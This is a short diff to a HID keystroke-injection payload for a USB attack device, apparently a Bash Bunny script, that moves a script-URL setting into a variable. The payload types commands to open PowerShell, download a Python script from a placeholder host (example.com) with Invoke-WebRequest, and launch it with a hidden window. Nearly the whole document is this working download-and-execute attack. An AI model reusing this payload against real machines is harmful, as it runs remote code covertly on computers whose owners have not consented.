@@ -13,18 +13,19 @@ ATTACKMODE HID
 # Requirements:
 #     - Internet Connection
 
+# VARIABLES
+- Set your Python script link
+SCRIPT-PY-LINK='example.com'
+
 QUACK DELAY 1000
 QUACK GUI r
 QUACK DELAY 500
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 500
-
-# REQUIRED - Set your Python script link
-QUACK STRING Invoke-WebRequest -Uri \"SCRIPT-PY-LINK\" -OutFile \"script.py\"
+QUACK STRING Invoke-WebRequest -Uri \"$SCRIPT-PY-LINK\" -OutFile \"script.py\"
 QUACK ENTER
 QUACK DELAY 500
-
 QUACK STRING Start-Process python.exe -ArgumentList \"script.py\" -WindowStyle Hidden
 QUACK ENTER
 QUACK DELAY 1000
